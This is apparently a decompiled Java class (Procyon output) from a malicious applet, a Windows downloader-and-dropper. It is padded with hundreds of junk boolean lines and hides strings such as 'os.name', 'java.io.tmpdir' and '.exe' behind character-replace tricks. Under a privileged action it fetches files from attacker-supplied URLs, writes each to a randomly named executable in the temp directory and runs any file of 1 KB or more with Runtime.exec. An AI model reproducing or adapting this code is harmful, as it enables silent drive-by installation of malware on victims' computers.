// 
// Decompiled by Procyon v0.5.30
// 

package sklif;

import java.security.AccessController;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.net.URL;
import java.security.PrivilegedExceptionAction;

public class Hiydcxed implements PrivilegedExceptionAction
{
    public static String data;
    public static String cc;
    
    public static byte[] StringToBytes(final String s) {
        false;
        false;
        true;
        false;
        true;
        false;
        true;
        true;
        false;
        true;
        true;
        false;
        final int n = 2;
        false;
        true;
        true;
        false;
        true;
        true;
        false;
        true;
        false;
        true;
        false;
        false;
        false;
        final byte[] array = new byte[s.length() / n];
        true;
        false;
        false;
        true;
        false;
        false;
        false;
        false;
        false;
        true;
        false;
        true;
        false;
        true;
        true;
        true;
        true;
        final int n2 = 16;
        true;
        true;
        false;
        false;
        true;
        true;
        true;
        false;
        true;
        true;
        true;
        true;
        false;
        true;
        true;
        true;
        true;
        false;
        false;
        false;
        false;
        true;
        for (int i = 0; i < s.length(); i += n) {
            true;
            false;
            array[i / n] = (byte)((Character.digit(s.charAt(i), n2) << 4) + Character.digit(s.charAt(i + 1), n2));
            true;
            true;
            true;
            true;
            true;
            true;
            false;
            false;
        }
        true;
        false;
        true;
        false;
        true;
        true;
        false;
        true;
        false;
        false;
        false;
        false;
        true;
        true;
        true;
        false;
        false;
        true;
        true;
        false;
        true;
        false;
        false;
        return array;
    }
    
    @Override
    public Object run() throws Exception {
        false;
        false;
        false;
        true;
        false;
        true;
        false;
        false;
        false;
        false;
        false;
        false;
        true;
        true;
        true;
        true;
        false;
        false;
        true;
        true;
        if (Hiydcxed.data == null) {
            return null;
        }
        true;
        true;
        false;
        true;
        false;
        true;
        false;
        try {
            true;
            true;
            true;
            true;
            true;
            false;
            true;
            true;
            false;
            false;
            true;
            true;
            true;
            true;
            true;
            false;
            false;
            true;
            false;
            true;
            false;
            false;
            false;
            true;
            false;
            false;
            true;
            true;
            final int n = 1024;
            false;
            false;
            false;
            true;
            false;
            true;
            true;
            true;
            true;
            final String property = System.getProperty("ouuus.name".replace("u", ""));
            false;
            false;
            false;
            false;
            false;
            true;
            false;
            true;
            false;
            false;
            true;
            false;
            false;
            false;
            if (property.indexOf("xxWixxxxndowsxxx".replace("x", "")) == -1) {
                true;
                false;
                false;
                false;
                true;
                true;
                false;
                return null;
            }
            true;
            true;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
            true;
            false;
            true;
            false;
            true;
            false;
            false;
            true;
            final Runtime runtime = Runtime.getRuntime();
            true;
            false;
            false;
            false;
            true;
            true;
            true;
            false;
            true;
            true;
            true;
            true;
            false;
            false;
            true;
            false;
            int int1 = 1;
            true;
            false;
            true;
            true;
            false;
            false;
            true;
            true;
            true;
            false;
            false;
            false;
            true;
            true;
            true;
            true;
            true;
            true;
            if (Hiydcxed.cc != null) {
                false;
                false;
                false;
                false;
                false;
                true;
                true;
                false;
                true;
                false;
                true;
                int1 = Integer.parseInt(Hiydcxed.cc);
                false;
                true;
                true;
                false;
            }
            true;
            false;
            true;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
            true;
            false;
            true;
            true;
            true;
            true;
            true;
            false;
            true;
            true;
            false;
            true;
            true;
            false;
            true;
            true;
            for (int i = 0; i < int1; ++i) {
                false;
                false;
                false;
                false;
                true;
                false;
                true;
                true;
                true;
                false;
                true;
                false;
                true;
                false;
                true;
                true;
                false;
                false;
                true;
                false;
                final URL url = new URL(Hiydcxed.data + Integer.toString(i));
                false;
                true;
                false;
                true;
                true;
                true;
                false;
                true;
                true;
                url.openConnection();
                true;
                false;
                false;
                true;
                false;
                true;
                true;
                true;
                true;
                true;
                true;
                final InputStream openStream = url.openStream();
                false;
                true;
                false;
                true;
                true;
                false;
                false;
                false;
                true;
                true;
                true;
                false;
                true;
                false;
                false;
                false;
                true;
                false;
                false;
                true;
                true;
                true;
                false;
                false;
                final String property2 = System.getProperty("uujauuuuvuua.uuuiuuuouuu.tuumuuuupuuduuuuiru".replace("u", ""));
                false;
                true;
                false;
                false;
                false;
                false;
                true;
                false;
                false;
                true;
                false;
                true;
                false;
                true;
                true;
                false;
                true;
                final String string = property2 + File.separator;
                true;
                false;
                true;
                false;
                false;
                false;
                final String string2 = string + Math.random();
                true;
                false;
                true;
                true;
                false;
                false;
                false;
                true;
                final String string3 = string2 + "AAA.exAAAAe".replace("A", "");
                false;
                false;
                true;
                false;
                false;
                false;
                true;
                true;
                false;
                false;
                false;
                true;
                false;
                false;
                true;
                true;
                true;
                false;
                true;
                false;
                false;
                false;
                false;
                true;
                false;
                false;
                true;
                false;
                false;
                final FileOutputStream fileOutputStream = new FileOutputStream(string3);
                false;
                false;
                false;
                true;
                true;
                true;
                false;
                true;
                false;
                true;
                true;
                false;
                true;
                true;
                false;
                false;
                true;
                false;
                false;
                false;
                true;
                false;
                false;
                true;
                true;
                true;
                false;
                false;
                true;
                true;
                true;
                false;
                true;
                false;
                true;
                int n2 = 0;
                int read;
                while ((read = openStream.read()) != -1) {
                    true;
                    false;
                    false;
                    true;
                    true;
                    true;
                    false;
                    fileOutputStream.write(read);
                    true;
                    true;
                    true;
                    false;
                    true;
                    true;
                    ++n2;
                }
                false;
                true;
                false;
                false;
                false;
                false;
                false;
                true;
                false;
                false;
                false;
                false;
                false;
                false;
                true;
                true;
                true;
                false;
                openStream.close();
                false;
                false;
                false;
                true;
                false;
                true;
                true;
                true;
                false;
                fileOutputStream.close();
                true;
                false;
                true;
                true;
                true;
                true;
                true;
                false;
                false;
                false;
                true;
                false;
                false;
                false;
                Boolean b = false;
                false;
                true;
                false;
                false;
                false;
                false;
                false;
                true;
                true;
                false;
                false;
                true;
                true;
                false;
                true;
                false;
                true;
                if (n2 >= n) {
                    false;
                    true;
                    false;
                    false;
                    false;
                    false;
                    b = true;
                    false;
                    false;
                    false;
                    true;
                    true;
                    true;
                    true;
                    false;
                }
                false;
                true;
                true;
                true;
                false;
                false;
                false;
                true;
                true;
                false;
                false;
                true;
                true;
                true;
                false;
                false;
                false;
                true;
                true;
                true;
                false;
                false;
                true;
                false;
                true;
                if (b) {
                    true;
                    true;
                    true;
                    false;
                    true;
                    false;
                    false;
                    true;
                    this.ef(runtime, string3);
                    false;
                    true;
                    true;
                    false;
                    true;
                    false;
                }
                false;
                true;
                true;
                true;
                true;
                true;
                true;
            }
            false;
            false;
            true;
            true;
            true;
            false;
            false;
            false;
            false;
            false;
            true;
            true;
            false;
            false;
            true;
            true;
            false;
            true;
            true;
            false;
            true;
            true;
            true;
            true;
            false;
            true;
            true;
        }
        catch (Exception ex) {
            true;
            true;
            true;
            true;
            false;
            true;
            false;
            false;
            true;
            false;
            true;
            true;
            false;
            false;
            false;
            false;
            true;
            false;
            true;
            false;
        }
        true;
        false;
        true;
        false;
        true;
        false;
        false;
        false;
        true;
        true;
        true;
        false;
        true;
        true;
        true;
        false;
        true;
        true;
        true;
        true;
        false;
        true;
        return null;
    }
    
    private Process ef(final Runtime runtime, final String s) throws Exception {
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        true;
        false;
        false;
        false;
        false;
        return runtime.exec(s, null, null);
    }
    
    public Hiydcxed() {
        false;
        true;
        true;
        false;
        false;
        false;
        false;
        false;
        true;
        false;
        false;
        true;
        try {
            false;
            false;
            true;
            false;
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
            false;
        }
        catch (Exception ex) {
            true;
            false;
            true;
            false;
            false;
            true;
            false;
            false;
            false;
            false;
            false;
            false;
            true;
            true;
            false;
            false;
            false;
        }
        true;
        true;
        false;
        false;
        false;
        true;
        false;
    }
    
    static {
        Hiydcxed.data = null;
        Hiydcxed.cc = null;
    }
}
